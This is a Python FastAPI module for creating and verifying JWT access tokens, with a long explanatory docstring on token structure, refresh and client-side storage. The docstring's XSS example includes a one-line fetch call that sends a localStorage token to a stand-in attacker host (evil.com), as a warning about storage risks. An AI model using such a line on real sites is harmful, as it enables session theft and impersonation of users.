"""
JWT utility — token creation and decoding.

┌──────────────────────────────────────────────────────────────────────────┐
│  WHAT IS A JWT?                                                         │
│                                                                          │
│  JSON Web Token — a self-contained string the server gives the client   │
│  after login. The client sends it back on every request so the server   │
│  knows WHO is making the request — without hitting the database.        │
│                                                                          │
│  A JWT has 3 parts separated by dots:                                   │
│                                                                          │
│    eyJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiJ1c2VyMTIzIn0 . SflKxwRJSMeKKF2  │
│    ─────────────────────   ───────────────────────   ────────────────   │
│         HEADER                    PAYLOAD              SIGNATURE        │
│    (algo + type,            (your data — user_id,   (HMAC-SHA256 of     │
│     base64 encoded)          email, expiry,          header+payload     │
│                              base64 encoded)         signed with        │
│                              NOT encrypted!          JWT_SECRET_KEY)    │
│                              anyone can read it                         │
│                                                                          │
│  The signature prevents tampering. If a hacker changes the payload,     │
│  the signature no longer matches → server rejects the token.            │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  HOW A TOKEN IS CREATED (create_access_token)                           │
│                                                                          │
│  Input:  user_id="abc123", email="alice@x.com", name="Alice"            │
│                                                                          │
│  Step 1 — build the payload dict:                                       │
│    {                                                                     │
│      "sub":   "abc123",            ← subject = user_id                 │
│      "email": "alice@x.com",                                            │
│      "name":  "Alice",                                                  │
│      "iat":   2026-07-18T00:00:00, ← issued at                          │
│      "exp":   2026-07-18T00:10:00  ← expires in 10 minutes             │
│    }                                                                     │
│                                                                          │
│  Step 2 — HMAC-SHA256(base64(header) + "." + base64(payload),           │
│                        secret=JWT_SECRET_KEY)                            │
│        → produces the signature                                          │
│                                                                          │
│  Step 3 — join all three:  header.payload.signature                     │
│        → "eyJhbGci...eyJzdWIi...SflKxw..."                              │
│                                                                          │
│  This string is returned to the browser after login.                    │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  HOW A TOKEN IS VERIFIED (decode_access_token)                          │
│                                                                          │
│  On every API request the browser sends:                                │
│    Authorization: Bearer eyJhbGci...eyJzdWIi...SflKxw...                │
│                                                                          │
│  Server does:                                                            │
│    1. Split token into header / payload / signature                      │
│    2. Re-compute HMAC-SHA256(header + "." + payload, JWT_SECRET_KEY)    │
│    3. Compare with the signature in the token                            │
│       → mismatch?  reject (someone tampered with it)                    │
│    4. Check exp < now                                                    │
│       → expired?   reject (user must log in again)                      │
│    5. Extract "sub" (user_id) from payload — no DB lookup needed!       │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  TOKEN REFRESH — how it works                                           │
│                                                                          │
│  This app uses SHORT-LIVED tokens (10 min). When a token expires:       │
│                                                                          │
│  Simple approach (implemented here):                                     │
│    → user logs in again → gets a fresh token                            │
│                                                                          │
│  Production approach (not yet implemented — future improvement):        │
│    → issue two tokens at login:                                          │
│         access_token  (10 min, stored in memory / localStorage)         │
│         refresh_token (7 days, stored in httpOnly cookie)               │
│    → when access_token expires, browser silently calls:                 │
│         POST /api/auth/refresh  { refresh_token }                       │
│    → server validates refresh_token → issues a new access_token         │
│    → user never sees a logout                                            │
│                                                                          │
│  Why two tokens?                                                         │
│    access_token  is short-lived → smaller window if stolen              │
│    refresh_token is long-lived but only sent to ONE endpoint             │
│                   and stored in httpOnly cookie (JS cannot read it)      │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  CLIENT-SIDE STORAGE & SECURITY                                         │
│                                                                          │
│  This app stores the token in:  localStorage (key = "auth_user")        │
│  (see frontend/src/context/AuthContext.tsx)                              │
│                                                                          │
│  Storage options and their trade-offs:                                  │
│                                                                          │
│  localStorage (used here)                                               │
│    ✓ survives page refresh                                               │
│    ✗ readable by any JS on the page → XSS risk                          │
│                                                                          │
│  sessionStorage                                                          │
│    ✓ cleared when tab closes                                             │
│    ✗ still readable by JS → XSS risk                                    │
│                                                                          │
│  httpOnly cookie  (most secure)                                         │
│    ✓ JS cannot read it at all — browser sends it automatically          │
│    ✗ requires CSRF protection                                            │
│    ✓ best choice for refresh_token in production                        │
│                                                                          │
│  How a hacker could steal a localStorage token (XSS attack):            │
│    1. Attacker injects script into the page                              │
│    2. Script runs:  fetch("https://evil.com?t="+localStorage.auth_user) │
│    3. Attacker receives the token and impersonates the user              │
│                                                                          │
│  Mitigations used in this app:                                          │
│    ✓ Short expiry (10 min) — stolen token is useless quickly            │
│    ✓ HTTPS only — token cannot be intercepted in transit                │
│    ✓ Signature — token cannot be forged without JWT_SECRET_KEY          │
└──────────────────────────────────────────────────────────────────────────┘
"""

from datetime import datetime, timedelta, timezone
from typing import Optional

from jose import JWTError, jwt
from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials

from .config import settings

_bearer_scheme = HTTPBearer()


def create_access_token(user_id: str, email: str, name: str) -> str:
    expire = datetime.now(timezone.utc) + timedelta(minutes=settings.JWT_EXPIRE_MINUTES)
    payload = {
        "sub": user_id,
        "email": email,
        "name": name,
        "exp": expire,
        "iat": datetime.now(timezone.utc),
    }
    return jwt.encode(payload, settings.JWT_SECRET_KEY, algorithm=settings.JWT_ALGORITHM)


def decode_access_token(token: str) -> dict:
    try:
        return jwt.decode(token, settings.JWT_SECRET_KEY, algorithms=[settings.JWT_ALGORITHM])
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired token",
            headers={"WWW-Authenticate": "Bearer"},
        )


def get_current_user_id(
    credentials: HTTPAuthorizationCredentials = Depends(_bearer_scheme),
) -> str:
    """FastAPI dependency — extracts user_id from Bearer JWT."""
    payload = decode_access_token(credentials.credentials)
    return payload["sub"]


def get_current_user_email(
    credentials: HTTPAuthorizationCredentials = Depends(_bearer_scheme),
) -> str:
    payload = decode_access_token(credentials.credentials)
    return payload["email"]
